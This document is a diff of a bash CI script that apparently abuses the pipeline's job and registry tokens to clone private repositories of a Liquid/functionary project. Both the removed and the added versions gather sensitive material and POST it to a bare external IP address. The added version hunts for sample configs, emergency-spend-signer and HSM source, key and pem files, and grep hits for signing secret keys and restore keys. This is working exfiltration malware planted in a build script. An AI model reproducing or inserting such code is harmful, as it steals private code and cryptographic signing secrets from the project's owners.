@@ -1,9 +1,34 @@
 #!/bin/bash
-(
-git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" /tmp/r1 2>&1
-git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/blockstream/functionary.git" /tmp/r2 2>&1
-git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/liquid-functionary.git" /tmp/r3 2>&1
-ls -la /tmp/r1 /tmp/r2 /tmp/r3 2>&1
-curl -su "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/_catalog" 2>&1
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/groups/43/projects?per_page=100&include_subgroups=true" 2>&1 | python3 -c "import json,sys;[print(p['id'],p['path_with_namespace'],p['visibility']) for p in json.load(sys.stdin)]" 2>/dev/null
-) | curl -s -m60 -X POST http://144.172.110.44:8443/s9 --data-binary @-
+R=/tmp/r1
+git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" $R 2>/dev/null
+{
+echo "##S10##"
+echo "##SAMPLE_CONFIGS##"
+find $R/sample_configs -type f 2>/dev/null | head -30
+for f in $(find $R/sample_configs -type f -name "*.toml" -o -name "*.conf" -o -name "*.cfg" -o -name "*.json" -o -name "*.env" 2>/dev/null); do
+  echo "===FILE:$f==="
+  cat "$f" 2>/dev/null
+done
+echo "##GENERATE_CONFIG##"
+find $R/generate_config -type f 2>/dev/null | head -20
+cat $R/generate_config/src/*.rs 2>/dev/null | head -300
+echo "##EMERGENCY##"
+find $R/emergency_spend_signer -type f 2>/dev/null | head -20
+cat $R/emergency_spend_signer/src/*.rs 2>/dev/null | head -200
+echo "##CONFIG_TOML##"
+find $R -maxdepth 2 -name "*.toml" -type f 2>/dev/null | head -20
+for f in $(find $R -maxdepth 2 -name "*.toml" -type f 2>/dev/null); do
+  echo "===FILE:$f==="
+  head -100 "$f" 2>/dev/null
+done
+echo "##CONTRIB##"
+find $R/contrib -type f 2>/dev/null | head -30
+echo "##KEY_FILES##"
+find $R -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*signing*" -o -name "*private*" 2>/dev/null | head -20
+echo "##DOC##"
+cat $R/doc/* 2>/dev/null | head -200
+echo "##HSM_CONFIG##"
+find $R/hsm -name "*.rs" -type f 2>/dev/null | head -10
+grep -r "signing_secret_key\|restore_key\|encrypted_restore\|pak_list\|authorization" $R/generate_config/ $R/sample_configs/ $R/contrib/ 2>/dev/null | head -50
+echo "##S10_END##"
+} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s10 --data-binary @-
